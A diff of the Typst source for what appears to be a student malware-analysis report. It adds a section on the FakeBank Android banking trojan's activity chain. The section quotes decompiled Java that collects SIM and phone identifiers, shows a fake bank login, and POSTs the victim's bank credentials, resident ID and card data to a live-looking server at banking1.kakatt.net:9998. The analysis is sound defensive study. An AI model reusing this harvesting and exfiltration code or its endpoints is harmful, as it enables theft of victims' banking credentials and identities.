@@ -7,7 +7,7 @@
   authors: "Andrea Mugnai, Jacopo Tucci",
   date: "2024/2025",
   doc,
-  imagepath: "marchio_unipi_black.svg"
+  imagepath: "/img/marchio_unipi_black.svg"
 )
 
 // Code block style
@@ -54,8 +54,9 @@ We found that 4 out of 5 samples belong to the same malware family, *FakeBank*, 
 #linebreak()
 #linebreak()
 The analyzed samples are connected to multiple remote servers, to which they transmit the collected data over HTTP connections.
-
-#heading(numbering: none)[Analyzed APK]
+#v(1em)
+*Analyzed APKs*
+#v(1em)
 
 During the project, we were tasked with analyzing four different variants of the *FakeBank* malware. Their SHA-256 hash values are as follows:
 #v(0.5em)
@@ -149,10 +150,133 @@ Anyway we can see, using tools like `curl` or `nslookup`, that the domain is not
 
 === Activities
 
+#v(1em)
+#figure(
+  image("/img/activities_fakebank.png", width: 40%),
+  caption: [
+    Activities
+  ], 
+)
+#label("activities_fakebank")
+#v(0.5em)
+As we can see in @activities_fakebank, the Malware performs different activities at the app startup. 
+#v(0.5em)
+#linebreak()
+*BankSplashActivity*
+#linebreak()
+#v(0.5em)
+The activity is a fake splash screen that is shown to the user when the application is launched, in seconds it collect:
+#v(0.5em)
+- Subscriber ID (IMSI)
+- Phone number
+- Sim Serial number
+```java
+void regPhone() {
+    TelephonyManager tm = (TelephonyManager) getSystemService("phone");
+    String sim_no = tm.getSubscriberId();
+    String getLine1Number = tm.getLine1Number();
+    if (getLine1Number == null || getLine1Number.length() < 11) {
+        getLine1Number = tm.getSimSerialNumber();
+    }
+    ParamsInfo.Line1Number = getLine1Number;
+    ParamsInfo.sim_no = sim_no;
+    params = new ArrayList();
+    params.add(new BasicNameValuePair("mobile_no", getLine1Number));
+    Date currentTime = new Date();
+    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
+```
+#v(0.5em)
+Sends all the information to a remote server, starting after 3 seconds the next activity.
+#v(0.5em)
+```java
+String insert_url = "http://banking1.kakatt.net:9998/send_sim_no.php";
+public void run() {
+    HttpClient httpclient = new DefaultHttpClient();
+    HttpPost httppost = new HttpPost(BankSplashActivity.this.insert_url);
+    try {
+        httppost.setEntity(new UrlEncodedFormEntity(BankSplashActivity.params, "EUC-KR"));
+        Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params));", "gone");
+//...
+Intent i = new Intent();
+i.setClass(BankSplashActivity.this, BankSplashNext.class);            
+``` 
+#v(0.5em)
+#linebreak()
+*BankSplashNext*
+#linebreak()
+#v(0.5em)
+This activity just create a new splash screen and then starts the `BankPreActivity` after 3 seconds.
+
+#v(0.5em)
+#linebreak()
+*BankPreActivity*
+#linebreak()
+#v(0.5em)
+This is again a fake splash screen with different buttons it belongs to the chain of activities that the malware uses to hide its malicious behavior. Effectively only the `nect` button is implemented leading to the next activity.
+
+#v(0.5em)
+#linebreak()
+*BankActivity*
+#linebreak()
+#v(0.5em)
+That's the phishing part of the malware. It shows a fake login screen that looks like the one of the bank. The user is asked to enter their credentials, which are then sent to the remote server. Then it jumps to `BankNumActivity`.
+#v(0.5em)
+```java
+public void onClick(View arg0) {
+    String str1 = BankActivity.this.ed1.getText().toString();
+    String str2 = BankActivity.this.ed2.getText().toString();
+    if (str1 != null && str2 != null) {
+        if (!str1.equals("") && !str2.equals("")) {
+            if (str2.length() == 13 && str1.length() > 5) {
+                BankInfo.bankinid = str1;
+                BankInfo.jumin = str2;
+                Intent intent = new Intent(); 
+          intent.setClass(BankActivity.this.getApplicationContext     
+                BankNumActivity.class);
+                BankActivity.this.startActivity(intent);
+```
+#v(0.5em)
+#linebreak()
+*BankNumActivity* and *BankScardActivity*
+#linebreak()
+#v(0.5em)
+Those two activities carry on the stealing phase of the malware, getting all the sensitive information of the users.
+
+#v(0.5em)
+#linebreak()
+*BankEndActivity*
+#linebreak()
+#v(0.5em)
+This activity is the last one of the chain.
+#show raw.where(lang: "java"): r => {
+    set text(size: 8pt)
+    show "println!": set text(green)
+    r
+  }
+    
+    ```java
+public String doInBackground(String... args) {
+  BankEndActivity.this.params = new ArrayList();
+  BankEndActivity.this.params.add(new BasicNameValuePair("phone", BankEndActivity.this.phoneNumber));
+  BankEndActivity.this.params.add(new BasicNameValuePair("bankinid", BankInfo.bankinid));
+  BankEndActivity.this.params.add(new BasicNameValuePair("jumin", BankInfo.jumin));
+  BankEndActivity.this.params.add(new BasicNameValuePair("banknum", BankInfo.banknum));
+  BankEndActivity.this.params.add(new BasicNameValuePair("banknumpw", BankInfo.banknumpw));
+  BankEndActivity.this.params.add(new BasicNameValuePair("paypw", BankInfo.paynum));
+  BankEndActivity.this.params.add(new BasicNameValuePair("scard", BankInfo.scard));
+  }
+```
+#v(0.5em)
+First it collect in an Array all the sensitive information of the user.
+#v(0.5em)
+```java
+String send_bank_url = "http://banking1.kakatt.net:9998/send_bank.php";
+JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivity.this.send_bank_url, "POST", BankEndActivity.this.params);
+
+```
+Then it sends all the information to a *remote server* (`http://banking1.kakatt.net:9998/send_bank.php`).
+
 #pagebreak()
-
-
-
 
 = RansomLoc family
 
